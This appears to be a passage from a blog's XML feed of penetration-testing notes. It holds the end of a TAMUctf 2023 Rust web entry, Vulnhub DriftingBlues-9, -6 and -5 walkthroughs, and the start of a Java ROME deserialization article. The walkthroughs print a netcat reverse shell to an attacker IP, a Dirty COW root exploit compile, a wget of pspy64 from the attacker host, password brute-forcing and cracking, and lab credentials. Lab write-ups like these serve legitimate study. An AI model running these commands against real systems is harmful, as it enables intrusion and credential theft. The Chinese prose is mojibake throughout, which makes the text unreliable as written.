class="variable">rng</span> = <span class="title function_ invoke__">thread_rng</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">ident</span> = [<span class="number">0u8</span>; <span class="number">256</span>]; <span class="comment">// big un-bruteforce-able bytes</span></span><br><span class="line">        rng.<span class="title function_ invoke__">fill_bytes</span>(&amp;<span class="keyword">mut</span> ident);</span><br><span class="line">        res.<span class="title function_ invoke__">add_cookie</span>(</span><br><span class="line">            &amp;Cookie::<span class="title function_ invoke__">build</span>(<span class="string">&quot;whoami&quot;</span>, hex::<span class="title function_ invoke__">encode</span>(ident))</span><br><span class="line">                .<span class="title function_ invoke__">http_only</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">finish</span>(),</span><br><span class="line">        )?;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> std::io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">addr</span> = std::env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;SERVER_ADDR&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Couldn&#x27;t find an appropriate server address; did you set SERVER_ADDR?&quot;</span>);</span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(|| App::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">service</span>(index).<span class="title function_ invoke__">service</span>(upload))</span><br><span class="line">        .<span class="title function_ invoke__">bind_uds</span>(addr)?</span><br><span class="line">        .<span class="title function_ invoke__">run</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://astr.cc/blog/tamuctf-2023-writeup/#web-lto">è¯¦è§£wp</a>   è¿™é‡Œä¸å¤ªæƒ³çœ‹å°±ä¸å†™äº†</p><h2 id="Flag-Fetcher"><a href="#Flag-Fetcher" class="headerlink" title="Flag Fetcher"></a>Flag Fetcher</h2><p>é¢˜ç›®</p><p>ä¸¤é“é¢˜éƒ½æ˜¯rust</p><p><a href="https://astr.cc/blog/tamuctf-2023-writeup/#flag-fetcher">è¯¦ç»†wp</a></p><p>æ¥ä¸‹æ¥å°±ä¸å†™äº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> TAMUctf 2023-web-å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhubâ€”â€”DriftingBlues-9</title>
      <link href="/posts/89f41699.html"/>
      <url>/posts/89f41699.html</url>
      
        <content type="html"><![CDATA[<p>å…ˆæ‰«ä¸€ä¸‹cæ®µå‘ç°é¶æœº</p><p><img src="../images/image-20230430223340760.png" alt="image-20230430223340760"></p><p>ç„¶åæ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230430223410966.png" alt="image-20230430223410966"></p><p>å‘ç°äº†ä¸ªæ–°ç«¯å£  æ²¡è§è¿‡</p><p><img src="../images/image-20230430223613576.png" alt="image-20230430223613576"></p><p>è¿˜æ˜¯å…ˆæŸ¥çœ‹ä¸€ä¸‹80ç«¯å£</p><p><img src="../images/image-20230430223917177.png" alt="image-20230430223917177"></p><p>æŸ¥çœ‹æºç å‘ç°ç‰ˆæœ¬å’Œæ¡†æ¶</p><p>é‚£ä¹ˆå°±å»æ‰¾ä¸€ä¸‹çœ‹å­˜ä¸å­˜åœ¨æ¼æ´</p><p><img src="../images/image-20230430224032571.png" alt="image-20230430224032571"></p><p>å‘ç°å­˜åœ¨æ¼æ´ï¼Œäºæ˜¯å°±å°è¯•è¿›è¡Œæ¼æ´åˆ©ç”¨</p><p><img src="../images/image-20230430224139189.png" alt="image-20230430224139189"></p><p>ç„¶åå°†è„šæœ¬å¤åˆ¶åˆ°å‡ºæ¥æ‰§è¡Œ</p><p><img src="../images/image-20230430224307635.png" alt="image-20230430224307635"></p><p><img src="../images/image-20230430224450992.png" alt="image-20230430224450992"></p><p>åˆšå¥½å‘ç°äº†æ•°æ®åº“çš„è´¦å·å¯†ç </p><p>è¿™é‡Œçš„è¯ä½¿ç”¨çš„python2  python3çš„è¯ä¼šæŠ¥é”™</p><p>è¿™é‡Œçœ‹çš„ä¸æ–¹ä¾¿ï¼Œäºæ˜¯å°è¯•ä¸€ä¸‹åå¼¹shell</p><p><img src="../images/image-20230430224534036.png" alt="image-20230430224534036"></p><p>å­˜åœ¨ncå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ncåå¼¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.142.129 6666 -e /bin/bash</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430224640615.png" alt="image-20230430224640615"></p><p>åå¼¹shellæˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¿›è¡Œpythonçš„shelläº¤äº’ä¸€ä¸‹</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•ä¸€ä¸‹åˆšåˆšæ‹¿åˆ°çš„æ•°æ®çš„è´¦å·å¯†ç è¿›è¡Œç”¨æˆ·çš„åˆ‡æ¢</p><p><strong><code>clapton / yaraklitepe</code></strong></p><p>å› ä¸ºç›´æ¥cd /home/clapton  æƒé™ä¸å¤Ÿ</p><p><img src="../images/image-20230430224951322.png" alt="image-20230430224951322"></p><p>æˆåŠŸäº†</p><p>ç„¶åå°±å¯ä»¥æ‹¿åˆ°ç¬¬ä¸€ä¸ªflagäº†</p><p><img src="../images/image-20230430225059208.png" alt="image-20230430225059208"></p><p>è¿™é‡Œçš„è¯åˆç»™å‡ºä¸€ä¸ªç¼“å†²åŒºæº¢å‡ºææƒï¼š</p><p>å…ˆæŠŠinputæ–‡ä»¶ä¸‹åˆ°æœ¬åœ°</p><p>å¼€å¯æœ‰ä¸ªæœåŠ¡   python -m SimpleHTTPServer    å› ä¸ºhttpæ¨¡å—æ²¡æœ‰ï¼Œå°±åªèƒ½ç”¨è¿™ä¸ªæ¨¡å—äº†</p><p><img src="../images/image-20230430230743704.png" alt="image-20230430230743704"></p><p>æˆåŠŸä¸‹åˆ°æœ¬åœ°</p><p>è¿™é‡Œè¿›è¡Œäº†è§£å°±è¡Œäº†  ç¼“å†²åŒºæº¢å‡ºææƒçŸ¥é“å°±è¡Œ   å®é™…çš„æ“ä½œä¸å¤ªä¼š</p><p><strong>æ€»ç»“</strong></p><p>å¼€å¯pythonæœåŠ¡çš„ä¸¤ä¸ªæ–¹æ³•</p><p><strong>python -m SimpleHTTPServer</strong></p><p><strong>python -m http.server</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhubâ€”â€”DriftingBlues-9 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhubâ€”â€”DriftingBlues-6</title>
      <link href="/posts/194b0b08.html"/>
      <url>/posts/194b0b08.html</url>
      
        <content type="html"><![CDATA[<p>å…ˆæ‰«cæ®µå‘ç°é¶æœº</p><p><img src="../images/image-20230430173241641.png" alt="image-20230430173241641"></p><p>ç„¶åæ¥ç€æ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230430173357986.png" alt="image-20230430173357986"></p><p>å‘ç°åªæœ‰ä¸€ä¸ª80ç«¯å£</p><p>äºæ˜¯è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230430173451936.png" alt="image-20230430173451936"></p><p>ç„¶åå°±å…ˆæ‰«ä¸€ä¸‹ç›®å½•å§</p><p><img src="../images/image-20230430173723541.png" alt="image-20230430173723541"></p><p><img src="../images/image-20230430173738876.png" alt="image-20230430173738876"></p><p>å‘ç°ç»™äº†ä¸€ä¸ªè·¯åŠ²</p><p>ç„¶åè¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230430173804181.png" alt="image-20230430173804181"></p><p>è¿™é‡Œçš„è¯çˆ¬è™«åè®®ä¹Ÿç»™äº†ä¸€ä¸ªæç¤º</p><p><strong>åˆ«å¿˜äº†åŠ ä¸Šï¼Œzipæ‰©å±•åˆ°ä½ çš„dir brute</strong></p><p>ç„¶ååœ¨é‡æ–°çˆ†ç ´ä¸€ä¸‹ç›®å½•ï¼Œå› ä¸ºé»˜è®¤å­—å…¸çˆ†ç ´ä¸å‡ºæ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://172.16.5.12/ -e php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100  </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430174416125.png" alt="image-20230430174416125"></p><p>æ‰«åˆ°æœ‰ä¸ªç›®å½•ï¼Œç„¶åè¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230430174504992.png" alt="image-20230430174504992"></p><p>å‘ç°ä¸‹è½½ä¸‹æ¥äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½†æ˜¯è®¿é—®å¾—éœ€è¦å¯†ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¼€å§‹ä½¿ç”¨johnè¿›è¡Œçˆ†ç ´ï¼Œå°±æ˜¯å¾—å…ˆæŠŠè¿™ä¸ªç©æ„è½¬åŒ–æˆjohnèƒ½è¯†åˆ«çš„æ ·å­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨å‘½ä»¤ï¼šzip2join spammer.zip  &gt;  password.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430174655867.png" alt="image-20230430174655867"></p><p>ç„¶åè¿›è¡Œçˆ†ç ´</p><p><img src="../images/image-20230430174724243.png" alt="image-20230430174724243"></p><p>çˆ†ç ´å‡ºæ¥äº†</p><p>ç„¶åè¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230430174828847.png" alt="image-20230430174828847"></p><p>å‘ç°ç»™äº†ä¸ªç±»ä¼¼è´¦å·å¯†ç çš„ä¸œè¥¿ï¼Œç„¶åå°±å¼€å§‹è¿›è¡Œåå°ç™»å½•</p><p><img src="../images/image-20230430174928134.png" alt="image-20230430174928134"></p><p>åå°ç™»å½•æˆåŠŸ</p><p>è¿™é‡Œå°±å¼€å§‹æ‰¾æ¼æ´åˆ©ç”¨ç‚¹äº†</p><p><img src="../images/image-20230430175657042.png" alt="image-20230430175657042"></p><p>è¿™é‡Œçš„è¯å¯ä»¥è¿›è¡Œæ¶æ„æ–‡ä»¶çš„ä¸Šä¼ ï¼Œåˆšå¥½å¯ä»¥è¿›è¡Œshellçš„åå¼¹</p><p>è¿™é‡Œçš„è¯å°±ä½¿ç”¨phpåå¼¹ï¼Œè¿™é‡Œçš„è¯kaliè‡ªå¸¦ï¼Œç›´æ¥ä¿®æ”¹ä½¿ç”¨å°±è¡Œäº†</p><p><img src="../images/image-20230430191641753.png" alt="image-20230430191641753"></p><p>ç„¶åè¿›å»ä¿®æ”¹ç›‘å¬çš„ipå’Œç«¯å£å°±è¡Œäº†</p><p><img src="../images/image-20230430191753036.png" alt="image-20230430191753036"></p><p>ç„¶åå¼€å§‹ç›‘å¬ç«¯å£</p><p><img src="../images/image-20230430191825803.png" alt="image-20230430191825803"></p><p>ç„¶åå°±å»æ‰¾ä¸€ä¸‹æ–‡ä»¶çš„ä¸Šä¼ åœ°å€</p><p><img src="../images/image-20230430191859356.png" alt="image-20230430191859356"></p><p><img src="../images/image-20230430191917306.png" alt="image-20230430191917306"></p><p>ç„¶åè¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230430191939612.png" alt="image-20230430191939612"></p><p>åå¼¹æˆåŠŸ</p><p>ç„¶åè¿›è¡Œpythonäº¤äº’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430192021688.png" alt="image-20230430192021688"></p><p>æˆåŠŸï¼Œç„¶åå°±å¼€å§‹è¿›è¡Œææƒäº†</p><p><img src="../images/image-20230430213348387.png" alt="image-20230430213348387"></p><p><strong>å†…æ ¸ç‰ˆæœ¬&gt;= 2.6.22</strong> ï¼Œ å°è¯•è„ç‰›ææƒ</p><p><a href="https://xz.aliyun.com/t/9757">è„ç‰›ææƒ</a></p><p><img src="../images/image-20230430213803970.png" alt="image-20230430213803970"></p><p>æ‰§è¡Œ <strong><code>searchsploit 40839</code></strong>    å› ä¸ºè¿™ä¸ªè„ç‰›å°±æ˜¯åˆ©ç”¨è¿™ä¸ªæ¥è¿›è¡Œææƒ</p><p><img src="../images/image-20230430214020860.png" alt="image-20230430214020860"></p><p><img src="../images/image-20230430214107311.png" alt="image-20230430214107311"></p><p>ç„¶åæœ¬åœ°å¼€å¯ä¸€ä¸ªpythonæœåŠ¡ï¼ŒæŠŠæ–‡ä»¶ä¼ åˆ°é¶æœºä¸Š</p><p><img src="../images/image-20230430214340317.png" alt="image-20230430214340317"></p><p>æˆåŠŸä¼ ä¸Šå»ï¼Œç„¶åè¿›è¡Œgccç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o 40839 -lcrypt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430214417629.png" alt="image-20230430214417629"></p><p>ç„¶åç»™å‘½ä»¤æ·»åŠ æœ€é«˜æƒé™</p><p><strong><code>chmod 777 40839</code></strong></p><p><img src="../images/image-20230430214530349.png" alt="image-20230430214530349"></p><p><img src="../images/image-20230430214743537.png" alt="image-20230430214743537"></p><p>ç„¶åå°±æ˜¯rootç”¨æˆ·äº†</p><p><img src="../images/image-20230430214806980.png" alt="image-20230430214806980"></p><p><strong>æ€»ç»“</strong></p><p>å†…æ ¸ç‰ˆæœ¬&gt;= 2.6.22  å°è¯•è„ç‰›ææƒ</p><p>å°è¯•ç ´è§£åŠ å¯†æ–‡ä»¶å¯ä»¥è€ƒè™‘å…ˆè½¬æˆjohnèƒ½è¯†åˆ«çš„æ ·å­ï¼Œç„¶ååœ¨ä½¿ç”¨johnæ¥è¿›è¡Œç ´è§£</p><p>s</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhubâ€”â€”DriftingBlues-6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhubâ€”â€”DriftingBlues-5</title>
      <link href="/posts/80425ab2.html"/>
      <url>/posts/80425ab2.html</url>
      
        <content type="html"><![CDATA[<p>å¼€å§‹å…ˆæ‰«ä¸€ä¸‹cæ®µå‘ç°é¶æœº</p><p><img src="../images/image-20230430155615236.png" alt="image-20230430155615236"></p><p>ç„¶åå¼€å§‹æ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230430155709668.png" alt="image-20230430155709668"></p><p>è¿˜æ˜¯æ ‡é…ä¸¤ä¸ªç«¯å£</p><p>è¿›è¡Œ80ç«¯å£çš„è®¿é—®</p><p><img src="../images/image-20230430155746105.png" alt="image-20230430155746105"></p><p>æ˜¯ä¸€ä¸ªwordpress cmsæ¡†æ¶çš„ç½‘é¡µ è¿™é‡Œä¹Ÿç»™äº†ç‰ˆæœ¬</p><p>å¯ä»¥å…ˆç”¨wpscanå·¥å…·å»è¿›è¡Œæ‰«æ</p><p>è¿™é‡Œå…ˆå»æ‰¾ä¸€ä¸‹åå°ï¼Œç”¨dirbå…ˆæ‰«ä¸€ä¸‹è¿™ä¸ªç½‘å€</p><p><img src="../images/image-20230430160144662.png" alt="image-20230430160144662"></p><p><img src="../images/image-20230430160134822.png" alt="image-20230430160134822"></p><p>æ‰«åˆ°äº†åå°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å»ç”¨wpcanå·¥å…·å»æ‰«ä¸€ä¸‹ç½‘ç«™çš„ç”¨æˆ·å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.205.142 -e u </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430160547357.png" alt="image-20230430160547357"></p><p>ç„¶åä½¿ç”¨cewlç”Ÿæˆå¯†ç å­—å…¸é…åˆwpscanè¿›è¡Œçˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -m 3 -w passwd.txt http://192.168.205.142 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430160711724.png" alt="image-20230430160711724"></p><p>-m  æ˜¯æŒ‡çš„å¯†ç çš„æœ€çŸ­é•¿åº¦</p><p>ç„¶åä½¿ç”¨wpcanè¿›è¡Œçˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.205.142/ -e u --passwords passwd.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430161014964.png" alt="image-20230430161014964"></p><p>æŠ¥å‡ºç”¨æˆ·åå’Œå¯†ç äº†ï¼Œæ¥ä¸‹æ¥è¿›è¡Œç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username: gill, Password: interchangeable</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430161140468.png" alt="image-20230430161140468"></p><p>æˆåŠŸè¿›è¡Œç™»å½•</p><p>äºæ˜¯å°±å¼€å§‹å°è¯•æ‰¾æ¼æ´äº†</p><p><img src="../images/image-20230430161251659.png" alt="image-20230430161251659"></p><p>å‘ç°ä¸€å¼ ç½‘ç«™é¡µé¢æ²¡æœ‰çš„å›¾ç‰‡ï¼Œäºæ˜¯å°è¯•æŠŠä»–ä¸‹è½½ä¸‹æ¥è¿›è¡ŒæŸ¥çœ‹</p><p><img src="../images/image-20230430161407371.png" alt="image-20230430161407371"></p><p>æˆåŠŸä¸‹è½½ä¸‹æ¥</p><p>è¿™é‡ŒæŸ¥çœ‹å›¾ç‰‡å¾—ä½¿ç”¨è¿™ä¸ªå·¥å…·</p><p><strong>exiftool</strong></p><p><img src="../images/image-20230430161620834.png" alt="image-20230430161620834"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get Install exiftool</span><br><span class="line">ä½¿ç”¨è¯¥å‘½ä»¤è¿›è¡Œå®‰è£…</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430162208301.png" alt="image-20230430162208301"></p><p><img src="../images/image-20230430162232774.png" alt="image-20230430162232774"></p><p>å‘ç°äº†sshçš„ç™»å½•å¯†ç ï¼Œäºæ˜¯å°è¯•å»è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230430162333707.png" alt="image-20230430162333707"></p><p>æˆåŠŸè¿›è¡Œç™»å½•</p><p><img src="../images/image-20230430162354156.png" alt="image-20230430162354156"></p><p>æ‹¿åˆ°ç¬¬ä¸€ä¸ªflagï¼Œè¿™é‡Œæœ‰ç¬¬äºŒä¸ªæ–‡ä»¶ï¼Œä¸çŸ¥é“æ˜¯å•¥</p><p>ç›´æ¥è¯»çš„è¯æ˜¯ä¹±ç </p><p>ä¸Šç½‘æœç´¢åå‘ç°</p><p><img src="../images/image-20230430162524584.png" alt="image-20230430162524584"></p><p><img src="../images/image-20230430163023836.png" alt="image-20230430163023836"></p><p>è¿™é‡Œçš„è¯æ˜¯ä½¿ç”¨scpå‘½ä»¤å°†æ–‡ä»¶å¤åˆ¶åˆ°æœ¬åœ°è¿›è¡ŒæŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp gill@192.168.142.149:/home/gill/key* /root</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430163242074.png" alt="image-20230430163242074"></p><p>æˆåŠŸä¼ è¾“ä¸‹æ¥</p><p><strong>å°† <code>keyfile.kdbx</code> å†…å®¹è½¬ä¸º <code>john</code> æ”¯æŒçš„æ ¼å¼ï¼š<code>keepass2john keyfile.kdbx &gt; Keepasshash.txt</code></strong></p><p><img src="../images/image-20230430163335747.png" alt="image-20230430163335747"></p><p>ç„¶åä½¿ç”¨johnè¿›è¡Œå¯†ç çš„çˆ†ç ´</p><p><img src="../images/image-20230430163622503.png" alt="image-20230430163622503"></p><p>çˆ†ç ´å‡ºæ¥é‚£ä¸ªåŠ å¯†æ–‡ä»¶é‡Œçš„å†…å®¹äº†</p><p>å°†åˆšæ‰çš„keyfile.kdbxæ–‡ä»¶ä¸Šä¼ åˆ°keeWeb, è¾“å…¥ç ´è§£å‡ºçš„å¯†ç å³å¯æ‰“å¼€ï¼Œå¾—åˆ°å…­ä¸ªç±»ä¼¼å¯†ç çš„å­—ç¬¦ä¸²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps://app.keeweb.info/</span><br></pre></td></tr></table></figure><p>è·å¾—äº†6ä¸ªå¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2real4surreal </span><br><span class="line">buddyretard</span><br><span class="line">closet313</span><br><span class="line">exalted</span><br><span class="line">fracturedocean</span><br><span class="line">zakkwylde</span><br></pre></td></tr></table></figure><p>ç„¶åå°è¯•ä½¿ç”¨è¿™äº›å¯†ç è¿›è¡Œrootç”¨æˆ·çš„ç™»å½•å…¨éƒ½å¤±è´¥äº†</p><p><img src="../images/image-20230430170151033.png" alt="image-20230430170151033"></p><p>è¿™é‡Œçš„è¯å¯ä»¥åˆ©ç”¨è¿™ä¸ªå·¥å…·æ¥è¿›è¡Œä½¿ï¼Œçœ‹ä¸€ä¸‹è¿›ç¨‹æœ‰æ²¡æœ‰å®šæ—¶æ‰§è¡Œçš„ä»»åŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kalièµ·ä¸ªä¸´æ—¶æœåŠ¡</span><br><span class="line">é¶æœºä¸‹è½½pspy64: wget http://192.168.111.7/pspy64</span><br><span class="line">ç»™äºˆæƒé™ï¼šchmod +x pspy64</span><br><span class="line">æ‰§è¡Œï¼š./pspy64</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430170732813.png" alt="image-20230430170732813"></p><p>æˆåŠŸä¸‹è½½ä¸‹è½½åˆ°é¶æœºä¸Š</p><p><img src="../images/image-20230430171115969.png" alt="image-20230430171115969"></p><p>è¿™ä¸ªä»»åŠ¡æ¯éš”ä¸€åˆ†é’Ÿå°±è‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡ï¼Œäºæ˜¯å°±çŒœæµ‹æ˜¯ä¼šå®šæ—¶æ‰§è¡Œä»»åŠ¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è€ƒè™‘ä½¿ç”¨ä»–æ¥è¿›è¡Œææƒäº†</p><p><img src="../images/image-20230430171233766.png" alt="image-20230430171233766"></p><p>åœ¨æ ¹ç›®å½•ä¸‹å‘ç°ä¸€ä¸ªè¯¡å¼‚çš„ç›®å½•ï¼Œäºæ˜¯è¿›è¡ŒæŸ¥çœ‹</p><p>é‚£ä¹ˆçŒœæµ‹æ˜¯ä½¿ç”¨ä»–è¿›è¡Œææƒï¼Œè¿™é‡Œä¹…åˆšå¥½ç”¨åˆ°ä¹‹å‰çˆ†ç ´å‡ºæ¥çš„å¯†ç äº†ï¼Œåœ¨æŸ¥çœ‹åˆ«äººçš„wpï¼Œå‘ç°key.shæºç çš„æ„æ€æ˜¯ï¼Œå¦‚æœè¿™ä¸ªæ–‡ä»¶ä¸‹æœ‰fracturedoceanè¿™ä¸ªæ–‡ä»¶çš„è¯ï¼Œå°±ä¼šæ‰§è¡Œä¸‹é¢çš„ä»£ç ï¼Œå°±ä¼šæŠŠè£…æœ‰rootï¼Œå¯†ç çš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥</p><p><img src="../images/image-20230430171856129.png" alt="image-20230430171856129"></p><p>æ‹¿åˆ°å¯†ç </p><p><img src="../images/image-20230430171951855.png" alt="image-20230430171951855"></p><p>è¿™å°±æ˜¯key.shçš„æ–‡ä»¶å†…å®¹äº†</p><p><strong>Vulnhubé¶æœºæ¸—é€æ€»ç»“ï¼š</strong><br>1.cewl ç”Ÿæˆå­—å…¸å’Œwpscan å·¥å…·æš´åŠ›ç ´è§£çš„ä½¿ç”¨<br>2.Exiftool è¿™ä¸ªå·¥å…·ç”¨æ¥å¯¹EXIFä¿¡æ¯è§£æ(ç¬¬ä¸€æ¬¡äº†è§£è¿™ä¸ªå·¥å…·çš„ä½¿ç”¨å’Œä½œç”¨)<br>3..kdbxæ–‡ä»¶å¯†ç ç ´è§£ï¼ˆæ–°çŸ¥è¯†ç‚¹ï¼Œç¬¬ä¸€æ¬¡åšèŠ±çš„æ—¶é—´æ¯”è¾ƒå¤šï¼‰<br>4.å¦‚æœä¸´æ—¶å¼€å¯ä¸äº†webæœåŠ¡ å¯ä»¥ä½¿ç”¨scp è¿™ä¸ªå‘½ä»¤ï¼ˆéå¸¸å¥½ç”¨ï¼ï¼ï¼‰<br>5.è§£å¯† keepass æ•°æ®åº“è·å–å¯†ç ï¼ˆè™½ç„¶æ²¡å•¥ç”¨ ä½†æ˜¯ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡äº†è§£ æ–°çŸ¥è¯†ç‚¹ï¼‰<br>6.å®šæ—¶ææƒ ä¸‹è½½è„šæœ¬pspy64 æŸ¥çœ‹ åˆ›å»ºkey æ–‡ä»¶ææƒ</p><p>è¿™é‡Œçš„pspy64å¯ä»¥è¿›è¡Œè¿›ç¨‹çš„æŸ¥çœ‹(ä¸ç”¨rootæƒé™)ï¼Œåˆšå¥½å¯ä»¥è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨å®šæ—¶ææƒ</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhubâ€”â€”DriftingBlues-5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaååºåˆ—åŒ–-Rome</title>
      <link href="/posts/a91085da.html"/>
      <url>/posts/a91085da.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1145">å‚è€ƒæ–‡ç« </a></p><p>ä»é›¶å¼€å§‹åˆ†æ</p><p>ROME æ˜¯ä¸€ä¸ªå¯ä»¥å…¼å®¹å¤šç§æ ¼å¼çš„ feeds è§£æå™¨ï¼Œå¯ä»¥ä»ä¸€ç§æ ¼å¼è½¬æ¢æˆå¦ä¸€ç§æ ¼å¼ï¼Œä¹Ÿå¯è¿”å›æŒ‡å®šæ ¼å¼æˆ– Java å¯¹è±¡ã€‚ROME å…¼å®¹äº† RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 ä»¥åŠ Atom 1.0 feeds æ ¼å¼ã€‚</p><p>Rome æä¾›äº† <strong>ToStringBean</strong> è¿™ä¸ªç±»ï¼Œæä¾›æ·±å…¥çš„ toString æ–¹æ³•å¯¹JavaBeanè¿›è¡Œæ“ä½œã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>Idea æ–°å»ºä¸€ä¸ªMavené¡¹ç›®</p><p>è¿™é‡Œç›´æ¥åˆ°mavenåŒ…å°±è¡Œäº†</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span 